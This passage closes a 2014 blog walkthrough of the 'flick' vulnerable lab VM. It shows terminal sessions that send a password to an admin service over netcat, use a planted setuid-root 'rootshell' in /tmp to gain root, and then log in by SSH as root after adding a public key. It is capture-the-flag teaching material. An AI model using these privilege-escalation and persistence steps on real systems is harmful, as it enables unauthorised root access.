<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; tabupJievas8Knoj
</span><span class='line'>OK: tabupJievas8Knoj
</span><span class='line'>
</span><span class='line'>Accepted! The door should be open now :poolparty:
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Fingers crossed there&rsquo;s a rootshell file in /tmp</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>ls -l /tmp
</span><span class='line'>total 112
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> robin robin     <span class="m">82</span> Aug <span class="m">12</span> 13:59 config.py
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root  root  <span class="m">109768</span> Aug <span class="m">13</span> 01:08 rootshell
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, what do you know - it worked ! Running /tmp/rootshell drops us to a root shell, where we can properly read the flag, and put our public key into authorized_keys.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>/tmp/rootshell
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robin<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>,1000<span class="o">(</span>robin<span class="o">)</span>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>And for completeness, an SSH session as root.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh root@192.168.0.106
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Wed Aug <span class="m">13</span> 01:11:18 SAST 2014
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:              90
</span><span class='line'>  Usage of /:   39.8% of 6.99GB   Users logged in:        2
</span><span class='line'>  Memory usage: 41%               IP address <span class="k">for</span> eth0:    192.168.0.106
</span><span class='line'>  Swap usage:   1%                IP address <span class="k">for</span> docker0: 172.17.42.1
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">79</span> packages can be updated.
</span><span class='line'><span class="m">51</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>New release <span class="s1">&#39;14.04.1 LTS&#39;</span> available.
</span><span class='line'>Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:59:56 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>root@flick:~# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@flick:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://gifstumblr.com/images/haters-gonna-hate_1042.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-08-13T01:00:28+01:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>